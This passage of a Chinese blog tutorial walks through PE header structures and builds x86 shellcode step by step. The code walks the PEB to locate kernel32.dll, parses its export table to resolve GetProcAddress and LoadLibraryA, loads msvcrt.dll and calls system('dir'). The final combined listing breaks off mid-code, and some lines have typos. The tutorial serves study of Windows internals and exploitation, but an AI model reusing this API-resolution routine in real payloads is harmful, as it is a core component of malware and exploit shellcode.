<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;             &#x2F;&#x2F; 00000000  4D 5A，Magic number</span><br><span class="line">    WORD   e_cblp;             &#x2F;&#x2F; 00000002  90 00，Bytes on last page of file</span><br><span class="line">    WORD   e_cp;               &#x2F;&#x2F; 00000004  03 00，Pages in file</span><br><span class="line">    WORD   e_crlc;            &#x2F;&#x2F; 00000006  00 00，Relocations</span><br><span class="line">    WORD   e_cparhdr;           &#x2F;&#x2F; 00000008  04 00，Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;        &#x2F;&#x2F; 0000000A  00 00，Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;          &#x2F;&#x2F; 0000000C  FF FF，Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                &#x2F;&#x2F; 0000000E  00 00，Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;             &#x2F;&#x2F; 00000010  B8 00，Initial SP value</span><br><span class="line">    WORD   e_csum;          &#x2F;&#x2F; 00000012  00 00，Checksum</span><br><span class="line">    WORD   e_ip;                &#x2F;&#x2F; 00000014  00 00，Initial IP value</span><br><span class="line">    WORD   e_cs;                &#x2F;&#x2F; 00000016  00 00，Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;        &#x2F;&#x2F; 00000018  40 00，File address of relocation table</span><br><span class="line">    WORD   e_ovno;           &#x2F;&#x2F; 0000001A  00 00，Overlay number</span><br><span class="line">WORD   e_res[4];            &#x2F;&#x2F; 0000001C  00 00 00 00，Reserved words</span><br><span class="line">        &#x2F;&#x2F; 00000020  00 00 00 00</span><br><span class="line">    WORD   e_oemid;             &#x2F;&#x2F; 00000024  00 00，OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;           &#x2F;&#x2F; 00000026  00 00，OEM information; e_oemid specific</span><br><span class="line">WORD   e_res2[10];          &#x2F;&#x2F; 00000028  00 00 00 00，Reserved words</span><br><span class="line">        &#x2F;&#x2F; 0000002C  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000030  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000034  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000038  00 00 00 00</span><br><span class="line">    LONG    e_lfanew;           &#x2F;&#x2F; 0000003C  F8 00 00 00，File address of new exe header</span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p>其中有用的两个字段，分别是e_magic和e_lfanew，一个是dos 签名：标志这是dos头，一个记载PE头的在文件中偏移，我们要拿到e_lfanew值，通过它来找到NT文件头，这里偏移量为0x3c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx,[ebx+0x3c];e_lfanew</span><br><span class="line">add edx,ebx;加上基地址，得到了PEheader地址</span><br></pre></td></tr></table></figure>

<p>来看看NT文件头</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS64 &#123;</span><br><span class="line">    DWORD Signature;&#x2F;&#x2F;Signature PE文件标识，被定义为00004550</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;&#x2F;&#x2F;FileHeader,该结构指向IMAGE_FILE_HEADER。</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#x2F;&#x2F;OptionalHeader,该结构指向_IMAGE_OPTIONAL_HEADER32,Windows操作系统可执行文件的大部分特性均在这个结构里面呈现</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line">#ifdef _WIN64</span><br><span class="line">typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS64                PIMAGE_NT_HEADERS;</span><br><span class="line">#else</span><br><span class="line">typedef IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS32                PIMAGE_NT_HEADERS;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<p>这里有两种，一种是32位的，一种是64位的，因为我这里是拿的c++中里面的库里面的结构体定义，直接复制粘贴过来了，结构上大体一样，这里OptionalHeader 指向着选项头</p>
<p>来看看选项头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">     WORD    Magic;                   &#x2F;&#x2F; 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span><br><span class="line">&#x2F;*Magic字段 ：说明文件的类型，如果为010Bh，表面文件为PE32；如果为0107h,表明文件为ROM映像；如果为20Bh,表面文件为PE64.*&#x2F;</span><br><span class="line">     BYTE    MajorLinkerVersion;      &#x2F;&#x2F; 链接程序的主版本号</span><br><span class="line">     BYTE    MinorLinkerVersion;      &#x2F;&#x2F; 链接程序的次版本号</span><br><span class="line">     DWORD   SizeOfCode;              &#x2F;&#x2F; 所有含代码的节的总大小</span><br><span class="line">     DWORD   SizeOfInitializedData;   &#x2F;&#x2F; 所有含已初始化数据的节的总大小</span><br><span class="line">     DWORD   SizeOfUninitializedData; &#x2F;&#x2F; 所有含未初始化数据的节的大小</span><br><span class="line">     DWORD   AddressOfEntryPoint;     &#x2F;&#x2F; 程序执行入口RVA</span><br><span class="line">     DWORD   BaseOfCode;              &#x2F;&#x2F; 代码的区块的起始RVA</span><br><span class="line">     DWORD   BaseOfData;              &#x2F;&#x2F; 数据的区块的起始RVA  </span><br><span class="line">     DWORD   ImageBase;               &#x2F;&#x2F; 程序的首选装载地址</span><br><span class="line">&#x2F;*ImageBase字段 指出文件的优先装入地址。也就是说当文件被执行时，如果可能的话，Windows优先将文件装入到由ImageBase字段指定的地址中。只有指定的地址已经被**模块</span><br><span class="line">使用时，文件才被装入到**地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快。如果文件</span><br><span class="line">被装载到**地址的话，将不得不进行重定位操作，这样就要慢一点。对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被**模块占据，所以EXE</span><br><span class="line">总是能够按照这个地址装入。这也意味着EXE文件不再需要重定位信息。对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被**的</span><br><span class="line">DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的 IMAGE_FILE_HEADER 结构的 Characteristics 字段中，DLL 文件对应的 IMAGE_FILE_RELOCS_STRIPPED </span><br><span class="line">位总是为0，而EXE文件的这个标志位总是为1。在链接的时候，可以通过对link.exe指定&#x2F;base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认</span><br><span class="line">优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。*&#x2F; </span><br><span class="line">     DWORD   SectionAlignment;        &#x2F;&#x2F; 内存中的区块的对齐大小</span><br><span class="line">     DWORD   FileAlignment;    &#x2F;&#x2F; 文件中的区块的对齐大小</span><br><span class="line">    WORD    MajorOperatingSystemVersion;  &#x2F;&#x2F; 要求操作系统最低版本号的主版本号</span><br><span class="line">    WORD    MinorOperatingSystemVersion;  &#x2F;&#x2F; 要求操作系统最低版本号的副版本号</span><br><span class="line"></span><br><span class="line">    WORD    MajorImageVersion;       &#x2F;&#x2F; 本PE文件映像的主版本号</span><br><span class="line">    WORD    MinorImageVersion;       &#x2F;&#x2F; 本PE文件映像的次版本号</span><br><span class="line">    WORD    MajorSubsystemVersion;   &#x2F;&#x2F; 运行所需要的子系统的主版本号</span><br><span class="line">    WORD    MinorSubsystemVersion;   &#x2F;&#x2F; 运行所需要的子系统的次版本号</span><br><span class="line">    DWORD   Win32VersionValue;       &#x2F;&#x2F; 子系统版本号，暂时保留未用。必须设置为0</span><br><span class="line">    DWORD   SizeOfImage;             &#x2F;&#x2F; 映像装入内存后的总尺寸    +54h </span><br><span class="line">    DWORD   SizeOfHeaders;           &#x2F;&#x2F; 所有头 + 区块表的尺寸大小</span><br><span class="line"></span><br><span class="line">    DWORD   CheckSum;                &#x2F;&#x2F; 映像的校检和       +5Ch    </span><br><span class="line">    WORD    Subsystem;               &#x2F;&#x2F; 可执行文件期望的子系统  表3-4</span><br><span class="line">    WORD    DllCharacteristics;      &#x2F;&#x2F; Dll文件属性 +60h     表3-6  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfStackReserve;      &#x2F;&#x2F; 初始化时保留的栈大小</span><br><span class="line">    DWORD   SizeOfStackCommit;       &#x2F;&#x2F; 初始化时实际提交的栈大小    +68h  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfHeapReserve;       &#x2F;&#x2F; 初始化时保留的堆大小</span><br><span class="line">    DWORD   SizeOfHeapCommit;        &#x2F;&#x2F; 初始化时实际提交的堆大小    +70h    </span><br><span class="line">&#x2F;*SizeOfHeapCommit字段：初始化时提交的堆大小，在进程初始化时设定的堆所占用的内存空间。默认值为1页。*&#x2F;</span><br><span class="line">         DWORD   LoaderFlags;             &#x2F;&#x2F; 加载标志   与调试有关，默认为 0 </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;     &#x2F;&#x2F; 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   &#x2F;&#x2F; 数据目录表</span><br><span class="line">&#x2F;*DataDirectory字段 这个字段可以说是最重要的字段之一，它由16个相同的IMAGE_DATA_DIRECTORY结构组成。虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同</span><br><span class="line">的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的</span><br><span class="line">数据块的。*&#x2F;</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>这里的DataDirectory字段是我们需要注意的，因为在这个字段中有导出表的数据块，算算该字段的偏移，0x78</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx + 0x78]</span><br><span class="line">add edx, ebx;export table addr</span><br></pre></td></tr></table></figure>

<p>我们来看看数据目录，IMAGE_DATA_DIRECTORY结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">  DWORD VirtualAddress;&#x2F;&#x2F;RVA</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>定义非常简单，但它仅仅指出了某种数据块的位置和长度，看一下索引所代表的含义：</p>
<table>
<thead>
<tr>
<th>索 引</th>
<th>索引值在Windows.inc中的预定义值</th>
<th>对应的数据块</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>IMAGE_DIRECTORY_ENTRY_EXPORT</td>
<td>导出表</td>
</tr>
<tr>
<td>1</td>
<td>IMAGE_DIRECTORY_ENTRY_IMPORT</td>
<td>导入表</td>
</tr>
<tr>
<td>2</td>
<td>IMAGE_DIRECTORY_ENTRY_RESOURCE</td>
<td>资源</td>
</tr>
<tr>
<td>3</td>
<td>IMAGE_DIRECTORY_ENTRY_EXCEPTION</td>
<td>异常（具体资料不详）</td>
</tr>
<tr>
<td>4</td>
<td>IMAGE_DIRECTORY_ENTRY_SECURITY</td>
<td>安全（具体资料不详）</td>
</tr>
<tr>
<td>5</td>
<td>IMAGE_DIRECTORY_ENTRY_BASERELOC</td>
<td>重定位表</td>
</tr>
<tr>
<td>6</td>
<td>IMAGE_DIRECTORY_ENTRY_DEBUG</td>
<td>调试信息</td>
</tr>
<tr>
<td>7</td>
<td>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</td>
<td>版权信息</td>
</tr>
<tr>
<td>8</td>
<td>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>9</td>
<td>IMAGE_DIRECTORY_ENTRY_TLS</td>
<td>Thread Local Storage</td>
</tr>
<tr>
<td>10</td>
<td>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>11</td>
<td>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>12</td>
<td>IMAGE_DIRECTORY_ENTRY_IAT</td>
<td>导入函数地址表</td>
</tr>
<tr>
<td>13</td>
<td>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>14</td>
<td>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</td>
<td>具体资料不详</td>
</tr>
<tr>
<td>15</td>
<td>未使用</td>
<td></td>
</tr>
</tbody></table>
<p>可以看到，我们要的导出表，就在第一个索引，我们必须得获得获得导出表的地址，但是前面的数据目录是记录着导出表的虚拟地址，而实际的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;   </span><br><span class="line">    DWORD   TimeDateStamp; &#x2F;&#x2F;时间戳.  编译的时间. 把秒转为时间.可以知道这个DLL是什么时候编译出来的.</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;　　　　　　　　　　　&#x2F;&#x2F;指向该导出表文件名的字符串,也就是这个DLL的名称</span><br><span class="line">    DWORD   Base; 　　　　　　　　　　&#x2F;&#x2F; 导出函数的起始序号</span><br><span class="line">    DWORD   NumberOfFunctions;     &#x2F;&#x2F;所有的导出函数的个数</span><br><span class="line">    DWORD   NumberOfNames;         &#x2F;&#x2F;以名字导出的函数的个数</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; 导出的函数地址的地址表  RVA  也就是 函数地址表  </span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; 导出的函数名称表的  RVA      也就是 函数名称表</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; 导出函数序号表的RVA         也就是 函数序号表</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>但是通过加偏移0x24，当然这是相对于DataDirectory这个基地址来说的，这里我们需要通过AddressOfNames这个指针数组来遍历kernel32.dll加载载的函数名称，来找到GetProcAddress等函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x20] ; AddressOfNames 偏移 </span><br><span class="line">add esi, ebx; Names table addr</span><br><span class="line">xor ecx,ecx;ecx清零</span><br><span class="line"></span><br><span class="line">Get_Function_ProcAddress:</span><br><span class="line">inc ecx;这里来计数，我们需要知道GetProcAddress的索引</span><br><span class="line">lodsd</span><br><span class="line">add eax,ebx</span><br><span class="line">cmp dword ptr[eax],0x50746547;比较前四个字节GetP字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress;没有找到就继续执行</span><br><span class="line">cmp dword ptr[eax + 0x4], 0x41636f72 ; 比较中间四个字节rocA字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress</span><br><span class="line">cmp dword ptr[eax + 0x8], 0x65726464 ; 比较中间四个字节ddre字符串的ascill</span><br><span class="line">jnz Get_Function_ProcAddress;这里差不多就稳了</span><br></pre></td></tr></table></figure>

<p>此时，我们只是找到GetProcAddress函数的索引，必须找到索引相对应的序号，但是注意序号都是从0开始的，这个后面会注意到，会自减1。</p>
<p>此时，我们只是通过索引来找到GetProcAddress函数的序号，然后我们可以利用序号来找到函数的实际地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov esi, [edx + 0x24]; AddressOfNameOrdinals字段的偏移</span><br><span class="line">add esi, ebx; AddressOfNameOrdinals虚拟地址</span><br><span class="line">mov cx, [esi + ecx * 2]  ; 名称序号数组以2字节大小为单位的数字</span><br><span class="line">dec ecx;自减，因为实际是以0开始的</span><br><span class="line">mov esi, [edx + 0x1c]    ; AddressOfFunctions 字段偏移</span><br><span class="line">add esi, ebx             ;AddressOfFunctions地址</span><br><span class="line">mov edx, [esi + ecx * 4] ;取出GetProcAddress RVA偏移</span><br><span class="line">add edx, ebx             ;  GetProcAddress地址</span><br></pre></td></tr></table></figure>

<p>总结一下在导出表查找函数的顺序：</p>
<blockquote>
<p>通过导出表AddressOfNames找到函数名称对应的索引 =》在AddressOfNameOrdinals表中找到索引对应的序号》通过序号在AddressOfFunctions找到对应的RVA偏移》加上基地址dll文件基地址和函数的RVA地址就得到了函数的RVA</p>
</blockquote>
<p><strong>如何获取LoadLibraryA函数地址？</strong></p>
<p>因为我们已经获得了GetProcAddress地址，我们可以利用GetProcAddress(kernel32, “LoadLibraryA”)这样的方式来查找LoadLibraryA函数的地址，但是在着之前，我们需要保存我们刚找到的地址,在栈上保存数据是最明智的选择。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push edx;GetProcAddress of addr</span><br><span class="line">;然后进行函数调用</span><br><span class="line">push 0x0</span><br><span class="line">push 0x41797261 ; aryA</span><br><span class="line">push 0x7262694c ; Libr</span><br><span class="line">push 0x64616f4c ; Load 入栈函数参数</span><br><span class="line">push esp        ; &quot;LoadLibrary&quot;</span><br><span class="line">push ebx        ;kernel32.dll of addr</span><br><span class="line">call edx;函数调用GetProcAddress(kernel32, “LoadLibraryA”)</span><br></pre></td></tr></table></figure>

<p>注意：函数调用会把结果输出到eax寄存器中，那么eax中存储的就是LoadLibraryA函数的地址了</p>
<h2 id="3-3-获取system函数地址"><a href="#3-3-获取system函数地址" class="headerlink" title="3.3 获取system函数地址"></a>3.3 获取system函数地址</h2><p>因为我们已经获取到LoadLibraryA函数地址，所以我们可以利用他来导入相应的库，然后通过GetProcAddress来获取system函数地址，但是我们也得先保持栈平衡，再来保存eax里的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x10    ; pop &quot;LoadLibraryA&quot;</span><br><span class="line">pop ecx         ; </span><br><span class="line">push eax        ; EAX &#x3D; LoadLibraryA of addr</span><br><span class="line"></span><br><span class="line">push 0x00</span><br><span class="line">push 0x00006c6c ;&quot;ll&quot;</span><br><span class="line">push 0x642e7472 ; &quot;rt.d&quot;</span><br><span class="line">push 0x6376736d ; &quot;msvc&quot;</span><br><span class="line">push esp        ; </span><br><span class="line">&quot;msvcrt.dll&quot;</span><br><span class="line">call eax        ; LoadLibrary(&quot;msvcrt.dll&quot;)</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure>

<p>注意：现在eax中将保存着msvcrt.dll动态链接库的基地址</p>
<p>然后我们通过GetProcAddress来获取system函数的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov edx，[esp+4];现在esp上是LoadLibraryA_addr esp+4是GetProcAddress esp+8是Kernel32.dll of addr,eax是msvcrt.dll addr</span><br><span class="line"></span><br><span class="line">push 0x00006d65;&quot;em&quot;</span><br><span class="line">push 0x74737973;&quot;syst&quot;</span><br><span class="line">push esp;&quot;system&quot;</span><br><span class="line">push eax;</span><br><span class="line">call edx;</span><br><span class="line">add esp,0x10</span><br></pre></td></tr></table></figure>

<p>注意：现在eax中保存着system函数的地址</p>
<p>然后进行函数调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx</span><br><span class="line">mov ebx,0x726964;&quot;dir&quot;</span><br><span class="line">push ebx</span><br><span class="line">push esp     </span><br><span class="line">call,eax</span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure>

<p>这里就基本上把shellcode完成了，但是还得把所有shellcode加在一起，还得调试更改：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">;通过PEB表找到kernel32.dll base地址    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  mov eax, fs: [ecx + 0x30]     </span><br><span class="line">  mov eax, [eax + 0xc]    </span><br><span class="line">  mov esi, [eax + 0x14]    </span><br><span class="line">  lodsd    </span><br><span class="line">  xchg eax, esi    </span><br><span class="line">  lodsd    </span><br><span class="line">  mov ebx, [eax + 0x10]    </span><br><span class="line">  push ebx ;kernel32.dll of 入栈</span><br><span class="line">;通过kernel32.dll 的PE文件结构，找到AddressOfNames    </span><br><span class="line">  mov edx, [ebx + 0x3c]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov edx, [edx + 0x78]    </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  mov esi, [edx + 0x20]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  xor ecx, ecx</span><br><span class="line">;通过addressofNames数组遍历得到GetProcAddress的索引</span><br><span class="line">Get_Function_GetProcAddress:   </span><br><span class="line">  inc ecx;    </span><br><span class="line">  lodsd    </span><br><span class="line">  add eax,ebx    </span><br><span class="line">  cmp dword ptr[eax],0x50746547    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x4], 0x41636f72    </span><br><span class="line">  jnz Get_Function_GetProcAddress    </span><br><span class="line">  cmp dword ptr[eax + 0x8], 0x65726464    </span><br><span class="line">  jnz Get_Function_GetProcAddress</span><br><span class="line">;通过AddressOfNameOrdinals加上索引，获得序号    </span><br><span class="line">  mov esi, [edx + 0x24]    </span><br><span class="line">  add esi, ebx    </span><br><span class="line">  mov cx, [esi + ecx * 2]    </span><br><span class="line">  dec ecx</span><br><span class="line">;通过AddressOfFunctions遍历序号获得GetProcAddress函数的地址    </span><br><span class="line">  mov esi, [edx + 0x1c]        </span><br><span class="line">  add esi, ebx               </span><br><span class="line">  mov edx, [esi + ecx * 4]     </span><br><span class="line">  add edx, ebx    </span><br><span class="line">  push edx ;GetProcAddress of addr入栈</span><br><span class="line">;通过Kernel32.dll of addr 和 Get   ProcAddress of addr 获得LoadLibraryA函数地址    </span><br><span class="line">  push 0x0    </span><br><span class="line">  push 0x41797261     </span><br><span class="line">  push 0x7262694c     </span><br><span class="line">  push 0x64616f4c     </span><br><span class="line">  push esp            </span><br><span class="line">  push ebx            </span><br><span class="line">  call edx    </span><br><span class="line">  add esp,0xc    </span><br><span class="line">  pop ecx    </span><br><span class="line">  push eax;LoadLibraryA of addr 入栈</span><br><span class="line">;导入msvcrt.dll文件    </span><br><span class="line">  add esp, 0x10    </span><br><span class="line">  push eax    </span><br><span class="line">  xor ecx,ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov cx, 0x6c6c    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x642e7472    </span><br><span class="line">  push 0x6376736d    </span><br><span class="line">  push esp    </span><br><span class="line">  call eax</span><br><span class="line">;通过GetProcAddress函数，传入msvcrt.dll地址，找到system地址    </span><br><span class="line">  add esp, 0x10;    </span><br><span class="line">  mov edx, [esp + 0x4]    </span><br><span class="line">  xor ecx, ecx    </span><br><span class="line">  push ecx    </span><br><span class="line">  mov ecx, 0x616E6F74    </span><br><span class="line">  push ecx    </span><br><span class="line">  push 0x6d65    </span><br><span 